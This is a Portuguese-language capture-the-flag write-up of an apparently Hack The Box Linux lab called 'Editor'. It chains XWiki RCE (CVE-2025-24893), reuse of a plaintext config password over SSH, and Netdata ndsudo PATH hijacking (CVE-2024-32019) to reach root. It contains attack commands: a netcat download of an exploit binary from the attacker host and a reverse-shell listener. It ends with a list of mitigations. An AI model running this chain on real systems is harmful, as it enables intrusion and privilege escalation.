---
title: "Editor"
date: 2026-10-10
type: "labs"
difficulty: "Medium"
pwned: true
os: "Linux"
tags: ["linux", "web", "xwiki", "cve-2025-24893", "rce", "ssh", "netdata", "ndsudo", "cve-2024-32019", "privesc"]
summary: "Linux box com XWiki vulneravel (CVE-2025-24893) para RCE, senha em config do XWiki -> SSH como oliver, e privesc via ndsudo do Netdata (CVE-2024-32019) para root."
machine_info:
  IP: "10.10.11.80"
  OS: "Linux"
  Dificuldade: "Medium"
  CVE: "CVE-2025-24893 (XWiki RCE) + CVE-2024-32019 (Netdata ndsudo)"
  Portas principais: "22/tcp (SSH), 80/tcp (HTTP)"
  Vhost: "wiki.editor.htb"
---

## Reconhecimento

```bash
$ nmap -A -T4 10.10.11.80 -oN portscan.txt
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH
80/tcp open  http    (XWiki)
```

Scan de vulnerabilidades no vhost HTTP:

```bash
$ nuclei -u http://wiki.editor.htb -o nuclei.txt
```

O Nuclei apontou o **CVE-2025-24893** (XWiki RCE) — detalhes confirmados no Exploit-DB.

> Adicione `editor.htb` e `wiki.editor.htb` ao `/etc/hosts` apontando para `10.10.11.80`.

## Exploração — XWiki RCE (CVE-2025-24893)

Com base no exploit do [Exploit-DB #52136](https://www.exploit-db.com/exploits/52136), foi necessário ajustar o endereço HTTPS/alvo para funcionar corretamente contra a máquina.

Após o RCE, estabiliza-se o shell com um TTY interativo:

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Enumeração

Usuários do sistema:

```bash
$ ls /home
oliver
```

Busca por senhas nos arquivos de configuração do XWiki:

```bash
$ grep -iR "pass" /etc/xwiki/*
...
theEd1t0rTeam99
```

🔑 Senha encontrada: `theEd1t0rTeam99`.

## Acesso SSH — `oliver` (User Flag)

Reuso da credencial descoberta:

```bash
$ ssh -4 oliver@editor.htb
# usuario: oliver | senha: theEd1t0rTeam99
```

- `-4` força conexão IPv4.

User flag disponível no home do `oliver`.

## Escalação de Privilégio — Netdata ndsudo (CVE-2024-32019)

O alvo tem o **Netdata** instalado, cujo helper `ndsudo` resolve binários pelo `PATH` sem caminho absoluto → um binário malicioso no `PATH` é executado com privilégio elevado (**CVE-2024-32019**).

Na máquina de ataque, compila o exploit **estaticamente** (evita dependências de lib no alvo):

```bash
$ x86_64-linux-gnu-gcc -o nvme exploit.c -static
```

Transfere o binário via netcat — na máquina de ataque (envia):

```bash
$ nc -lvnp 4444 < nvme
```

No alvo (recebe):

```bash
oliver@editor:~$ nc 10.10.14.8 4444 > nvme
oliver@editor:~$ chmod +x nvme
```

Executa colocando o diretório atual no `PATH` e chamando o `ndsudo` com uma ação que invoca `nvme`:

```bash
oliver@editor:~$ PATH=$(pwd):$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

Enquanto isso, na máquina de ataque, escuta a reverse shell (porta definida pelo exploit):

```bash
$ nc -lvnp 9001
# shell como root -> root flag
```

✅ Shell como **root** e leitura da root flag.

## Flags

```
user.txt → /home/oliver/user.txt
root.txt → /root/root.txt (via reverse shell root)
```

## Vulnerabilidades

- **CVE-2025-24893 (XWiki RCE)** — execução remota de código no XWiki, acesso inicial.
- **Credenciais em texto claro** — senha do usuário embutida nas configs em `/etc/xwiki`.
- **Reuso de credencial** — mesma senha válida para SSH (`oliver`).
- **CVE-2024-32019 (Netdata `ndsudo`)** — resolução de binário por `PATH` relativo permite execução privilegiada de binário controlado pelo atacante.

**Mitigações:** atualizar XWiki e Netdata; não armazenar senhas em texto claro em arquivos de config; usar credenciais distintas por serviço; garantir que helpers privilegiados usem caminhos absolutos e `PATH` controlado.

## Referências

- Exploit-DB #52136 (XWiki CVE-2025-24893): https://www.exploit-db.com/exploits/52136
